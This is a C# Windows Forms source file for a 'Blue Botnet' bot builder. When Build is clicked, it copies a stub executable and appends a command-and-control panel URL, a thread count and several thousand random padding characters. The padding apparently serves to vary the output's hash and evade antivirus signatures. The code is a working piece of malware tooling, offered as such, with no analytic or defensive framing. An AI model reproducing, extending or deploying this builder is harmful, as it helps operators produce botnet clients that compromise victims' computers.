using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Blue_Botnet_Bot_Builder
{
    public partial class Builder : Form
    {
        public Builder()
        {
            InitializeComponent();
        }
		private string RandomString(int minlen, int maxlen)
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			Random random = new Random();
			char[] array = new char[random.Next(minlen) + (maxlen - minlen)];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = text[random.Next(text.Length)];
			}
			return new string(array);
		}

		private void Build_Click(object sender, EventArgs e)
        {
			File.Copy("raw.stub", "Built.exe");
			FileStream fileStream = new FileStream("Built.exe", FileMode.Append);
			BinaryWriter binaryWriter = new BinaryWriter(fileStream);
			binaryWriter.Write(string.Concat(new object[]
			{
				"-START-",
				PanelURL.Text,
				'*',
				Threads.Text,
				"-END-",
				RandomString(4000, 7000)
			}));
			binaryWriter.Flush();
			binaryWriter.Close();
			fileStream.Close();
		}
    }
}
